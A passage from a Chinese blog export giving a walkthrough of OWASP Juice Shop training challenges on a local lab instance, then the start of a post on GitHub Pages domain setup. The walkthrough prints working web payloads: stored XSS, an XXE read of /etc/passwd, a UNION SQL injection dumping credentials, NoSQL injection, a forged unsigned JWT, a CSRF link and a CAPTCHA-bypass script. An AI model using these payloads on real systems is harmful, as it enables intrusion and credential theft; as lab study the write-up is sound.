href="#XSS-Tier-2-XSS第二关" class="headerlink" title="XSS Tier 2 XSS第二关"></a>XSS Tier 2 XSS第二关</h3><blockquote><p>Perform a persisted XSS attack with <script>alert("XSS")</script> bypassing a client-side security mechanism. 绕过客户端安全机制执行存储型 XSS攻击。<script>alert("XSS")</script></p></blockquote><p>xss的输入点其实不多，但是最容易想到的是用户名，注册一个用户。改包修改邮箱为xss语句</p><pre><code>{&quot;email&quot;:&quot;&lt;script&gt;alert(\&quot;xss3\&quot;)&lt;/script&gt;&quot;,&quot;password&quot;:&quot;123123&quot;,&quot;passwordRepeat&quot;:&quot;123123&quot;,&quot;securityQuestion&quot;:{&quot;id&quot;:1,&quot;question&quot;:&quot;Your eldest siblings middle name?&lt;script&gt;alert(/xss/)&lt;script&gt;&quot;,&quot;createdAt&quot;:&quot;2018-04-21T02:42:19.878Z&quot;,&quot;updatedAt&quot;:&quot;2018-04-21T02:42:19.878Z&quot;},&quot;securityAnswer&quot;:&quot;123123&quot;}</code></pre><p>这个xss能在管理员页面弹出 <a href="http://192.168.209.146:3001/#/administration" target="_blank" rel="noopener">http://192.168.209.146:3001/#/administration</a> ，商品评论绕过不了，无法xss。</p><h3 id="XSS-Tier-3-XSS第三关"><a href="#XSS-Tier-3-XSS第三关" class="headerlink" title="XSS Tier 3 XSS第三关"></a>XSS Tier 3 XSS第三关</h3><blockquote><p>Perform a persisted XSS attack with <script>alert("XSS")</script> without using the frontend application at all. 执行存储型 XSS攻击<script>alert("XSS")</script>，根本不使用前端应用程序。</p></blockquote><p>前文我们说道发现了一个API接口<a href="http://192.168.209.146:3001/api/Products/9" target="_blank" rel="noopener">http://192.168.209.146:3001/api/Products/9</a>，并且这里可以修改描述信息，这里存在一个存储型的xss。使用 payload <code>{&quot;description&quot;:&quot;&lt;script&gt;alert(\&quot;xss\&quot;)&lt;/script&gt;&quot;}</code> 就阔以了，然而计分板没有显示我完成xss。</p><p>后来发现 api/Products 接口可以POST，这里POST一个新的商品也是可以XSS攻击的。注意需要用管理员的 Authorization 进行验证，否则会报401错误。</p>{% image https://i.loli.net/2018/04/21/5adaa9ed493fa.jpg '' '' %}{% image https://i.loli.net/2018/04/21/5adaaa44d92b6.jpg '' '' %}<h3 id="XXE-Tier-1-XXE第一关"><a href="#XXE-Tier-1-XXE第一关" class="headerlink" title="XXE Tier 1 XXE第一关"></a>XXE Tier 1 XXE第一关</h3><blockquote><p>Retrieve the content of C:\Windows\system.ini or /etc/passwd from the server. 用XXE攻击搞到服务器的/etc/passwd</p></blockquote><p>构造xml文件如下</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;</code></pre><p>上传到投诉页面的上传点就过了，不过暂时不知道输出点哪儿</p><p><strong>update</strong>: 使用docker搭建时，XXE的关卡都不可用</p><h2 id="四星难度"><a href="#四星难度" class="headerlink" title="四星难度"></a>四星难度</h2><h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><blockquote><p>Change Bender’s password into slurmCl4ssic without using SQL Injection. 不用SQL注入修改Bender的密码</p></blockquote><p>只能是重置密码咯，到重置密码那儿抓个包，发现修改密码使用的是GET方式 <a href="http://192.168.209.146:3001/rest/user/change-password?current=123123123&amp;new=123123&amp;repeat=123123" target="_blank" rel="noopener">http://192.168.209.146:3001/rest/user/change-password?current=123123123&amp;new=123123&amp;repeat=123123</a></p><p>经过测试，发现<a href="http://192.168.209.146:3001/rest/user/change-password?new=123123&amp;repeat=123123" target="_blank" rel="noopener">http://192.168.209.146:3001/rest/user/change-password?new=123123&amp;repeat=123123</a>直接就可以返回200，无需原来的密码，此处代码应该是存在 current 关键字时才进行检测，没有就不检测。因此可以利用该链接做一个CSRF攻击。</p><p>然后通过SQL注入登录到bender的账户（……），模仿bender点击一下这个链接 <a href="http://192.168.209.146:3001/rest/user/change-password?new=slurmCl4ssic&amp;repeat=slurmCl4ssic" target="_blank" rel="noopener">http://192.168.209.146:3001/rest/user/change-password?new=slurmCl4ssic&amp;repeat=slurmCl4ssic</a> 触发即可。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2018/04/21/5adae8d3b8ad8.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><p>一般的CSRF不会让用户发现，这里说明存在CSRF，具体怎么欺骗构造就不说了。</p><h3 id="Easter-Egg-Tier-1-amp-Easter-Egg-Tier-2"><a href="#Easter-Egg-Tier-1-amp-Easter-Egg-Tier-2" class="headerlink" title="Easter Egg Tier 1 &amp; Easter Egg Tier 2"></a>Easter Egg Tier 1 &amp; Easter Egg Tier 2</h3><blockquote><p>Find the hidden easter egg.Apply some advanced cryptanalysis to find the real easter egg. 找到隐藏的复活节彩蛋，使用高级点儿密码分析来寻找真正的复活节彩蛋。</p></blockquote><p>还记得FTP目录吗？在里面有个eastere.gg文件，同样使用%00截断即可。</p><p>文件下下来后里面有一段密文，明显是base64。转码完成后再用rot13即可找到路径，访问即可，这个页面还是很好玩的233</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2018/04/21/5adaec31e9b69.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><h3 id="Eye-Candy-秀色可餐"><a href="#Eye-Candy-秀色可餐" class="headerlink" title="Eye Candy 秀色可餐"></a>Eye Candy 秀色可餐</h3><blockquote><p>Travel back in time to the golden era of [image] web design. 回到这种老式设计的黄金年代</p></blockquote><p>意思让样式回到这种复古的样子。看这个hot图片的地址为<a href="http://192.168.209.146:3001/css/geo-bootstrap/img/hot.gif" target="_blank" rel="noopener">http://192.168.209.146:3001/css/geo-bootstrap/img/hot.gif</a></p><p>这个比较懵圈，看别人的WP是在其CSS框架网址<a href="https://github.com/divshot/geo-bootstrap" target="_blank" rel="noopener">https://github.com/divshot/geo-bootstrap</a>中提到了这个主题的 <code>bootstrap.css</code> 位于 <code>/swatch</code>上。因此打开JS控制台输入 <code>document.getElementById(&quot;theme&quot;).setAttribute(&quot;href&quot;, &quot;css/geo-bootstrap/swatch/bootstrap.css&quot;);</code>即可</p><p>这个主题还是很酷的233</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2018/04/21/5adaee6f3ad0b.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><h3 id="Forgotten-Developer-Backup-被遗忘的开发者备份"><a href="#Forgotten-Developer-Backup-被遗忘的开发者备份" class="headerlink" title="Forgotten Developer Backup 被遗忘的开发者备份"></a>Forgotten Developer Backup 被遗忘的开发者备份</h3><blockquote><p>Access a developer’s forgotten backup file. </p></blockquote><p>不用说也知道在哪儿了吧，和前一关一样的地方。方法一样是%00截断下载。</p><h3 id="Login-Bjoern-登录Bjoern"><a href="#Login-Bjoern-登录Bjoern" class="headerlink" title="Login Bjoern 登录Bjoern"></a>Login Bjoern 登录Bjoern</h3><blockquote><p>Log in with Bjoern’s user account without previously changing his password, applying SQL Injection, or hacking his Google account.<br>要求不能通过改密码、sql注入和社工登录。</p></blockquote><p>之前在折腾xss的时候，发现了一个api接口，返回的是用户的数据，包括密码，所以就放到repeater找Bjoern，看到其密码为32位的，第一个想到的是md5，然而查不到……</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2018/04/21/5adaefecc5e43.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><p>这题解不出来，看了WP，是Bjoern(该项目的编写者)通过谷歌的oauth登陆，由于本地搭建的应用是无法跟谷歌oauth互动，所以可以到 <a href="http://demo.owasp-juice.shop/" target="_blank" rel="noopener">http://demo.owasp-juice.shop/</a> 中去做这个挑战。该作者的email是<code>bjoern.kimminich@googlemail.com</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2018/12/13/5c1250fa67188.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><p>在main.js中搜索oauth，看一下谷歌账号登陆的处理过程：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2018/12/13/5c12517bf0e69.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><p>password的处理是<code>btoa(n.email.split(&quot;&quot;).reverse().join(&quot;&quot;))</code>，btoa()函数就是base64的意思，所以这里密码只是根据邮箱变化而得。直接在console执行<code>btoa(&quot;bjoern.kimminich@googlemail.com&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;))</code>，获得密码<code>bW9jLmxpYW1lbGdvb2dAaGNpbmltbWlrLm5yZW9qYg==</code>，使用该账户和密码登陆即可。</p><h3 id="Misplaced-Signature-File-错位的siem签名文件。"><a href="#Misplaced-Signature-File-错位的siem签名文件。" class="headerlink" title="Misplaced Signature File 错位的siem签名文件。"></a>Misplaced Signature File 错位的siem签名文件。</h3><blockquote><p>Access a misplaced SIEM signature file.访问错位的siem签名文件。</p></blockquote><p>FTP下的 <code>suspicious_errors.yml</code>文件，同样%00截断。</p><h3 id="NoSQL-Injection-Tier-1-NoSQL注入第一关"><a href="#NoSQL-Injection-Tier-1-NoSQL注入第一关" class="headerlink" title="NoSQL Injection Tier 1 NoSQL注入第一关"></a>NoSQL Injection Tier 1 NoSQL注入第一关</h3><blockquote><p>Let the server sleep for some time. (It has done more than enough hard work for you) 让服务器休眠一段时间。</p></blockquote><p>重点在于能找到该rest接口，存在在评论<code>/rest/product/3/reviews</code>处，商品id参数可控，此处可以执行命令<code>/rest/product/sleep(999)/reviews</code>，相当于一个dos了。</p><h3 id="NoSQL-Injection-Tier-2"><a href="#NoSQL-Injection-Tier-2" class="headerlink" title="NoSQL Injection Tier 2"></a>NoSQL Injection Tier 2</h3><blockquote><p>Update multiple product reviews at the same time.</p></blockquote><p>与上一题同样的接口，使用NoSQL注入最简单的一个payload，利用正则进行注入<code>{ &quot;id&quot;: { &quot;$ne&quot;: -1 }, &quot;message&quot;: &quot;NoSQL Injection!&quot; }</code></p><h3 id="Redirects-Tier-2-重定向第二关"><a href="#Redirects-Tier-2-重定向第二关" class="headerlink" title="Redirects Tier 2 重定向第二关"></a>Redirects Tier 2 重定向第二关</h3><blockquote><p>Wherever you go, there you are.</p></blockquote><p>在各个页面搜索一下<code>redirect</code>，在关于我们-<code>Fork me on github</code>的label上找到了该问题：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2018/12/14/5c1327b4d4eee.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><p>修改to参数重定向到baidu，返回406报错，此处同样可以完成一星难度的<em>Error Handling</em></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2018/12/14/5c132835b1bea.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><p>这里的知识点是重定向URL的白名单问题，只要<code>to</code>参数中有白名单域名就可以过，此题有多种解法，使用 <code>/redirect?to=https://www.baidu.com/?a=https://github.com/bkimminich/juice-shop</code> 可过</p><h3 id="Reset-Bender’s-Password-重置Bender的密码"><a href="#Reset-Bender’s-Password-重置Bender的密码" class="headerlink" title="Reset Bender’s Password 重置Bender的密码"></a>Reset Bender’s Password 重置Bender的密码</h3><blockquote><p>Reset Bender’s password via the Forgot Password mechanism with the original answer to his security question.<br>通过忘记的密码机制重置Bender密码</p></blockquote><p>在四星难度里已经使用过CSRF重置了Bender的密码，但是一个知识点放有两道题比较奇怪，之后对了一下wp，发现这题还可以有别的解，不过同样也是美国人的思路。</p><ol><li>首先说到Bender，美国人第一个想到的应该是这个动漫角色 <a href="https://en.wikipedia.org/wiki/Bender_(Futurama)" target="_blank" rel="noopener">Bender</a></li><li>用重置密码功能，邮箱我们已经知道是<code>bender@juice-sh.op</code>，看密码重置的问题是<figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2018/12/14/5c1346f06e294.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure></li><li>意思是成年后第一份工作的公司是什么，在Bender的wiki中可以看到他现在工作的公司是<code>Futurama</code>，在角色传记里面提到了是<a href="https://futurama.fandom.com/wiki/Suicide_booth" target="_blank" rel="noopener">FUTURAMA wiki-Suicide booth</a></li><li>在该wiki里面写到了最重要的一个品牌就是<code>Stop&#39;n&#39;Drop</code><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2018/12/14/5c13531f29039.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure></li><li>填入该公司名称就可以重置了</li><li>总结：这个过程还是培养一个人的社工能力吧，就是国家思维不一样导致理解有点困难，但是思路还是可以学习的。</li></ol><h3 id="Typosquatting-Tier-1-域名注册第一关"><a href="#Typosquatting-Tier-1-域名注册第一关" class="headerlink" title="Typosquatting Tier 1 域名注册第一关"></a>Typosquatting Tier 1 域名注册第一关</h3><blockquote><p>Inform the shop about a typosquatting trick it has become victim of. (Mention the exact name of the culprit) 告知商店他们的库存在typosquatting问题</p></blockquote><p>看记分板的提示是说之前的开发者文件泄露，该题还是翻了别人的WP。<br>看<code>package.json.bak</code>里面有个 <a href="https://www.npmjs.com/package/epilogue-js" target="_blank" rel="noopener">epilogue-js</a> ，这个就是typosquatting的库。提交<code>epilogue-js</code>到客户反馈提交即可。</p><p>该题的关键点是知道<code>typosquatting</code>是什么东西：</p><blockquote><p>攻击者使用 typosquatting 的方法来上传这些恶意库到 PyPI 平台上，他们上传的恶意库的名字和那些正常的库的名字非常相似，很容易让人混淆，比如将”urlib” 写成 “urllib”。</p></blockquote><h3 id="User-Credentials"><a href="#User-Credentials" class="headerlink" title="User Credentials"></a>User Credentials</h3><blockquote><p>Retrieve a list of all user credentials via SQL Injection</p></blockquote><p>要求用SQL注入搞到所有用户信息。两个SQL注入点，用搜索框的的注入点就好啦，有回显：<code>qwert&#39;)) UNION SELECT &#39;1&#39;, id, email, password, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39; FROM Users--</code></p><h3 id="Vulnerable-Library-有漏洞的库"><a href="#Vulnerable-Library-有漏洞的库" class="headerlink" title="Vulnerable Library 有漏洞的库"></a>Vulnerable Library 有漏洞的库</h3><blockquote><p>Inform the shop about a vulnerable library it is using. (Mention the exact library name and version in your comment) </p></blockquote><p><code>package.json.bak</code> 的 <code>sanitize-html</code> 指定了固定的版本：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2018/12/14/5c1350439e9e3.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><p>这个漏洞就体现在下一题的持久型xss。</p><h3 id="XSS-Tier-4"><a href="#XSS-Tier-4" class="headerlink" title="XSS Tier 4"></a>XSS Tier 4</h3><blockquote><p>Perform a persisted XSS attack with <script>alert("XSS")</script> bypassing a server-side security mechanism. 持久型xss</p></blockquote><p>这个题有多个解</p><ol><li><code>联系我们</code>处存在的一个持久型xss，payload为 <code>&lt;&lt;script&gt;Foo&lt;/script&gt;script&gt;alert(&quot;XSS&quot;)&lt;&lt;/script&gt;/script&gt;</code></li><li>注册User的api处，<code>email</code>参数过滤不严可以造成持久型XSS，administrator登陆后，由于页面有用户信息会直接xss。</li></ol><h2 id="五星难度"><a href="#五星难度" class="headerlink" title="五星难度"></a>五星难度</h2><h3 id="CAPTCHA-Bypass-验证码绕过"><a href="#CAPTCHA-Bypass-验证码绕过" class="headerlink" title="CAPTCHA Bypass 验证码绕过"></a>CAPTCHA Bypass 验证码绕过</h3><blockquote><p>Submit 10 or more customer feedbacks within 10 seconds. 在10s内提交10+顾客反馈</p></blockquote><p>一个很入门的脚本编写题，需要在10秒内提交10个以上的反馈。chrome开F12提交一个普通的反馈，查看<code>Network</code>，请求captcha返回的数据为<code>{&quot;captchaId&quot;:17,&quot;captcha&quot;:&quot;10+4+4&quot;,&quot;answer&quot;:&quot;18&quot;}</code>，captcha结果妥妥地躺在返回包中。</p><p>再看提交反馈的包，验证码取返回验证码包中的<code>answer</code>，<code>captchaId</code>即验证码id。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2018/12/18/5c18b1a2dbaaf.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><p>写脚本过即可，注意json的处理。</p><pre><code class="Python">import requestsimport jsonpost_url = &#39;http://192.168.14.142:3000/api/Feedbacks&#39;captcha_url = &#39;http://192.168.14.142:3000/rest/captcha/&#39;headers = {    &#39;Content-Type&#39;: &#39;application/json;charset=UTF-8&#39;,    &#39;Cookie&#39;: &#39;cookieconsent_status=dismirequests; continueCode=o1o17zpBWv3DENkqXL89JQYOA6gHbuXH8clgdwM2ZV4jgKnxR5rmyabPle6j; io=6xLNWoRR4wKbTGiEAAAK&#39;}data = {&quot;comment&quot;: &quot;terrrible&quot;, &quot;rating&quot;: 1, &quot;captcha&quot;: &quot;55&quot;, &quot;captchaId&quot;: 5}for _ in range(15):    captcha = requests.get(captcha_url).json()    data[&#39;captcha&#39;] = captcha[&#39;answer&#39;]    data[&#39;captchaId&#39;] = captcha[&#39;captchaId&#39;]    print(requests.post(post_url, data=json.dumps(data), headers=headers, timeout=1).text)</code></pre><h3 id="Extra-Language-额外的语言"><a href="#Extra-Language-额外的语言" class="headerlink" title="Extra Language 额外的语言"></a>Extra Language 额外的语言</h3><blockquote><p>Retrieve the language file that never made it into production. 找到一个不在生产环境出现过的语言文件</p></blockquote><p>妥妥的脑洞题。在Burp中看浏览记录，语言文件的目录在<code>/i18n</code>下，文件名为<code>/i18n/en.json</code>，根据命名规则，用两位字母+下划线+两位字母爆破的话量太大了……</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2018/12/18/5c18b0e985335.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><p>还是看了一下别人的writeup，原来是<code>tlh_AA.json</code>，克林贡语。还是学习一下Intruder的用法吧：</p><ol><li>选择<code>Cluster bomb</code>模式：</li></ol><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2018/12/18/5c18ba25582ea.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><ol start="2"><li>在<code>Payloads</code>中选择<code>Payload Type</code>为<code>Brute forcer</code>爆破模式，<code>min length</code>最小长度选择为2，<code>max length</code>最大长度选择为2即可。</li></ol><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2018/12/18/5c18ba5960416.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><h3 id="JWT-Issues-Tier-1-JWT问题第一关"><a href="#JWT-Issues-Tier-1-JWT问题第一关" class="headerlink" title="JWT Issues Tier 1 JWT问题第一关"></a>JWT Issues Tier 1 JWT问题第一关</h3><blockquote><p>Forge an essentially unsigned JWT token that impersonates the (non-existing) user <a href="mailto:jwtn3d@juice-sh.op" target="_blank" rel="noopener">jwtn3d@juice-sh.op</a>. 伪造一个基本上未签名的JWT token，仿冒（不存在的）用户<a href="mailto:jwtn3d@juice-sh.op" target="_blank" rel="noopener">jwtn3d@juice-sh.op</a>。</p></blockquote><p>先解释一下什么叫JWT：</p><blockquote><p>JWT是json web token缩写。它将用户信息加密到token里，服务器不保存任何用户信息。服务器通过使用保存的密钥验证token的正确性，只要正确即通过验证。优点是在分布式系统中，很好地解决了单点登录问题，很容易解决了session共享的问题。缺点是无法作废已颁布的令牌/不易应对数据过期。</p></blockquote><p>以下是解题过程</p><ol><li>抓登陆的包，返回token就是JWT↓</li></ol><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2018/12/18/5c18bf2c3a978.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><p>对JWT解码最常用的是到 <a href="https://jwt.io/" target="_blank" rel="noopener">jwt.io</a>  解密，采用默认的<code>RS256</code>算法即可解码 。Decoded处的Header说明了采用的算法<code>alg</code>和Token类型<code>typ</code>，Payload处则是该token解码后的内容，Verified signature是签名，这三项分别对应Encoded处三处以<code>.</code>号分割的不同颜色的payload。↓</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2018/12/18/5c18c63bdb99f.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><ol start="2"><li>这道题考察点在于，JWT的Header和Payload是通过base64编码得到，意思是Header和Payload很容易被伪造，而不同的算法只是用于对数据进行签名校验而已。因此，如果服务器不检验签名或检验签名的流程有问题，那么直接解码Payload验证用户信息则会造成漏洞。所以，该题我们需要仿冒用户<code>jwtn3d@juice-sh.op</code>的话需要修改Header的算法为<code>none</code>，修改Payload的用户邮箱和Exp(过期账户时间，调大一点就可以)，将header和payload进行base64编码后，用<code>.</code>连接Header和Payload，注意最后面多加一个<code>.</code>，用于标识签名为空：↓</li></ol><pre><code>eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwiZW1haWwiOiJqd3RuM2RAanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjAxOTIwMjNhN2JiZDczMjUwNTE2ZjA2OWRmMThiNTAwIiwiY3JlYXRlZEF0IjoiMjAxOC0wOC0xMiAwNzo1MzozOC4wNjQgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAxOC0wOC0xMiAwNzo1MzozOC4wNjQgKzAwOjAwIn0sImlhdCI6MTUzNDA2MDUzOSwiZXhwIjoxNTU0MDc4NTM5fQ.</code></pre>{% image https://i.loli.net/2018/12/18/5c18e65baa15e.jpg '' '' %}<ol start="3"><li>使用<code>Modify Header</code>修改<code>Authorization</code>请求头，注意该请求头前面有<code>Bearer</code>前缀。由于服务器端会验证算法，服务端接收到我们构造的如下Payload后，解码得到该Auth算法为<code>None</code>，服务器运行算法<code>None</code>（就是什么也没有）后得出的签名结果为<code>None</code>，与请求的签名（为空）对比，验证通过！这就达到了我们伪造JWT的目的。↓</li></ol>{% image https://i.loli.net/2018/12/18/5c18e4a20e393.jpg '' '' %}<h3 id="Login-CISO-登录CISO"><a href="#Login-CISO-登录CISO" class="headerlink" title="Login CISO 登录CISO"></a>Login CISO 登录CISO</h3><blockquote><p>Exploit OAuth 2.0 to log in with the Chief Information Security Officer’s user account. 利用OAuth 2.0登录CSO的帐户</p></blockquote><p>还是从OAuth说起，OAuth是一种授权框架，OAuth2协议定义了一套用户、第三方服务和存储着用户数据的平台之间的交互规则，可以使得用户无需将自己的用户名和密码暴露给第三方，即可使第三方应用获取用户在该平台上的数据，最常见的场景便是现在互联网上的各种使用XXX账号登录，JWT算是其中的一种认证机制。</p><p>以下是解题过程</p><ol><li><p>如果你还记得前面Bjoern谷歌登陆，密码是base64(邮箱)的那道题的话，可以回去翻看一下js文件，这里使用到的就是OAuth登陆方式。在前面的SQL注入中，我们拉取到了所有用户的列表，其中有个邮箱为<code>ciso@juice-sh.op</code>即为CISO的邮箱。</p></li><li><p>在Juice Shop里面，登陆功能中有个记住用户的勾选，返回的参数中含有一个<code>umail</code>，并且之后的请求中请求头会有一个<code>X-User-Email</code>，本地Cookie中也有一个email的cookie</p>{% image https://i.loli.net/2018/12/19/5c19bdcd9e4da.jpg '' '' %}{% image https://i.loli.net/2018/12/18/5c18ea88b9bb5.jpg '' '' %}{% image https://i.loli.net/2018/12/19/5c19c27f2b053.jpg '' '' %}</li><li><p>因此我们使用<code>ciso@juice-sh.op</code>登陆，密码任意，即使登陆失败后</p></li><li><p>做到这里歇菜了，看别人WP可以通过两种方式走Oauth认证：</p><ol><li><p>在 <a href="http://demo.owasp-juice.shop" target="_blank" rel="noopener">demo.owasp-juice.shop</a> 上勾选记住用户，使用自己的google账户登陆，然后修改X-User-Email字段为CISO的邮箱即可<br><img src="https://i.loli.net/2018/12/19/5c19b2f4299e9.jpg" alt></p></li><li><p>在Login的时候</p></li></ol></li></ol><p>无法复现</p><h3 id="RCE-Tier-1-RCE第一关"><a href="#RCE-Tier-1-RCE第一关" class="headerlink" title="RCE Tier 1 RCE第一关"></a>RCE Tier 1 RCE第一关</h3><blockquote><p>Perform a Remote Code Execution that would keep a less hardened application busy forever. 执行远程执行代码，让一个持久性较差的应用程序处于繁忙状态。</p></blockquote><ol><li>在目录探测时候发现了<code>/api-docs/</code>，该目录是商城API的文档</li><li>该处可以直接编辑请求表单执行，看到这里就想到可能存在代码执行的问题。{% image https://i.loli.net/2018/12/26/5c22d486619d3.jpg '' '' %}</li></ol><p>请求JSON如下，并且还需要点击<code>Authorize</code>按钮，输入自己的<code>bearerAuth</code>（就是前面说到的JWT token）进行身份认证</p><pre><code>{  &quot;cid&quot;: &quot;JS0815DE&quot;,  &quot;orderLines&quot;: [    {      &quot;productId&quot;: 8,      &quot;quantity&quot;: 500,      &quot;customerReference&quot;: &quot;PO0000001&quot;    }  ],  &quot;orderLinesData&quot;: &quot;[{\&quot;productId\&quot;: 12,\&quot;quantity\&quot;: 10000,\&quot;customerReference\&quot;: [\&quot;PO0000001.2\&quot;, \&quot;SM20180105|042\&quot;],\&quot;couponCode\&quot;: \&quot;pes[Bh.u*t\&quot;},{\&quot;productId\&quot;: 13,\&quot;quantity\&quot;: 2000,\&quot;customerReference\&quot;: \&quot;PO0000003.4\&quot;}]&quot;}</code></pre><ol start="3"><li><p>点击<code>Execute</code>，可以看到在执行的为curl命令，JSON的<code>orderLinesData</code>带入了命令，此处存在代码执行的问题，但是利用不会，所以用了别人的Payload：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2018/12/26/5c22d68ca4c6c.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure></li><li><p>替换JSON为 <code>{&quot;orderLinesData&quot;: &quot;(function dos() { while(true); })()&quot;}</code>，作用是使该命令进入死循环，发出后服务器返回500，该处pass。</p></li></ol><h3 id="Reset-Bjoern’s-Password-重置Bjoern的密码"><a href="#Reset-Bjoern’s-Password-重置Bjoern的密码" class="headerlink" title="Reset Bjoern’s Password 重置Bjoern的密码"></a>Reset Bjoern’s Password 重置Bjoern的密码</h3><blockquote><p>Reset Bjoern’s password via the Forgot Password mechanism with the original answer to his security question. 通过忘记密码机制重置Bjoern的密码，并附上他的安全问题的原始答案。</p></blockquote><h3 id="Reset-Morty’s-Password-重置Morty的密码"><a href="#Reset-Morty’s-Password-重置Morty的密码" class="headerlink" title="Reset Morty’s Password 重置Morty的密码"></a>Reset Morty’s Password 重置Morty的密码</h3><blockquote><p>Reset Morty’s password via the Forgot Password mechanism with his obfuscated answer to his security question. 通过忘记密码机制重置Morty的密码，并对其安全问题进行模糊回答。</p></blockquote><h3 id="Retrieve-Blueprint-检索Blueprint"><a href="#Retrieve-Blueprint-检索Blueprint" class="headerlink" title="Retrieve Blueprint 检索Blueprint"></a>Retrieve Blueprint 检索Blueprint</h3><blockquote><p>Deprive the shop of earnings by downloading the blueprint for one of its products. 通过下载其中一个产品的Blurprint来移除商店的收入。</p></blockquote><h3 id="Typosquatting-Tier-2-注册近似域名-第二关"><a href="#Typosquatting-Tier-2-注册近似域名-第二关" class="headerlink" title="Typosquatting Tier 2 注册近似域名 第二关"></a>Typosquatting Tier 2 注册近似域名 第二关</h3><blockquote><p>Inform the shop about a more literal instance of typosquatting it fell for. (Mention the exact name of the culprit) 告知商店一个更为文字化的域名抢注案例。</p></blockquote><h3 id="XXE-Tier-2-XXE第二关"><a href="#XXE-Tier-2-XXE第二关" class="headerlink" title="XXE Tier 2 XXE第二关"></a>XXE Tier 2 XXE第二关</h3><blockquote><p>Give the server something to chew on for quite a while. 上传一个文件让服务器繁忙。</p></blockquote><h2 id="六星难度"><a href="#六星难度" class="headerlink" title="六星难度"></a>六星难度</h2><p>累了，之后持续更新补上</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Gitpages绑定域名及启用HTTPS</title>
      <link href="20180224/Gitpages%E7%BB%91%E5%AE%9A%E5%9F%9F%E5%90%8D%E5%8F%8A%E5%90%AF%E7%94%A8HTTPS.html"/>
      <url>20180224/Gitpages%E7%BB%91%E5%AE%9A%E5%9F%9F%E5%90%8D%E5%8F%8A%E5%90%AF%E7%94%A8HTTPS.html</url>
      
        <content type="html"><![CDATA[<p>为了不使用看起来就很长的、B格不够高的<a href>*.github.io</a>作为博客地址，我购买了一个域名(<a href="n3ver.top">n3ver.top</a>)，将<a href="blog.n3ver.top">blog.n3ver.top</a>绑定到我的Github Pages上，并且使用了HTTPS。接下来是我的做法：</p><a id="more"></a><h3 id="绑定域名"><a href="#绑定域名" class="headerlink" title="绑定域名"></a>绑定域名</h3><ol><li><p>域名从阿里云下的万网处购买，在域名管理中点击解析-添加解析</p></li><li><p>具体设置如图所示，因为我使用子域名作为博客地址，因此此处选择CNAME作为记录类型</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="../../images/201802241345_432.png" alt title>                </div>                <div class="image-caption"></div>            </figure></li><li><p>在Github Pages中的source目录中添加CNAME文件，填入域名；更新设置。</p><pre><code class="bash"> touch CNAME vim CNAME blog.n3ver.top :q hexo g hexo d</code></pre></li><li><p>等待5分钟即可生效</p></li></ol><h3 id="启用HTTPS"><a href="#启用HTTPS" class="headerlink" title="启用HTTPS"></a>启用HTTPS</h3><h4 